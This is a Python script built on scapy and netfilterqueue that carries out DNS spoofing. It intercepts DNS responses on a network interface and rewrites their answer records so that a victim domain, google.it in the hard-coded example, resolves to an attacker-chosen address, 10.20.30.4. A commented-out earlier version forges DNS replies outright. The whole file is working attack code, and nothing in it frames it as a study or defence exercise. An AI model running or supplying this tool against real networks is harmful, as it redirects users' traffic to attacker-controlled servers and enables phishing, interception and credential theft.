from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, UDP
import netfilterqueue

'''def dns_response(packet, interface, redirected_webserver, victim_webserver = None):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:  # Check if it's a DNS query
        # Extract the DNS query details
        dns_query = packet.getlayer(DNS)
        dns_id = dns_query.id
        dns_qname = dns_query.qd.qname
        dns_qtype = dns_query.qd.qtype
        dns_qclass = dns_query.qd.qclass

        print("got DNS packet")
        
        if victim_webserver in dns_qname.decode() or victim_webserver is None:
            # Create DNS response packet
            dns_response = DNS(
                id=dns_id,
                qr=1,  # QR flag: Response
                aa=1,  # AA flag: Authoritative Answer
                qdcount=1,  # Number of questions
                ancount=1,  # Number of answers
                nscount=0,  # Number of authoritative name servers
                arcount=0,  # Number of additional records
                qd=DNSQR(qname=dns_qname, qtype=dns_qtype, qclass=dns_qclass),  # DNS question section
                an=DNSRR(rrname=dns_qname, type=dns_qtype, rclass=dns_qclass, ttl=3600, rdata=redirected_webserver),  # DNS answer section
            )
            
            # Create IP packet
            ip_packet = IP(dst=packet[IP].src, src=packet[IP].dst)
            
            # Create UDP packet
            udp_packet = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
            
            # Construct the final packet
            response_packet = ip_packet / udp_packet / dns_response
            
            # Send the response packet
            send(response_packet, verbose=0, iface=interface)
            print("Sent forged packet")
        else:
            print("Not important")'''

def dns_response(pkt, interface, redirected_webserver, victim_webserver = None):
    packet = IP(pkt.get_payload())
    print("Got packet", hex(packet[DNS].id))
    print(packet.show())
    if packet.haslayer(DNSRR):
        print("Got DNS response packet")
        qname = packet[DNSQR].qname

        if victim_webserver in qname.decode() or victim_webserver is None:
            packet[DNSRR].rdata = redirected_webserver
            
            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum

            pkt.set_payload(bytes(packet))
            print("DNS packet was modified")
    
    pkt.accept()
    print("Packet forwarded\n")

def dns_attack(interface, redirected_webserver, victim_webserver = None):
    #bpf_filter = 'udp and port 53'
    
    #sniff(filter = bpf_filter, prn = lambda pkt: dns_response(pkt, interface, redirected_webserver, victim_webserver), iface = interface)
    queue = netfilterqueue.NetfilterQueue()

    # Bind the queue to the nfqueue subsystem, specify the callback function
    queue.bind(0, lambda pkt: dns_response(pkt, interface, redirected_webserver, victim_webserver))

    try:
        # Run the queue
        queue.run()
    except KeyboardInterrupt:
        # Exit gracefully on Ctrl+C
        print("[+] User interrupted.")
        # Flush the IP tables
        queue.unbind()

    


if __name__ == '__main__':
    dns_attack("wlp0s20f3", "10.20.30.4", "google.it")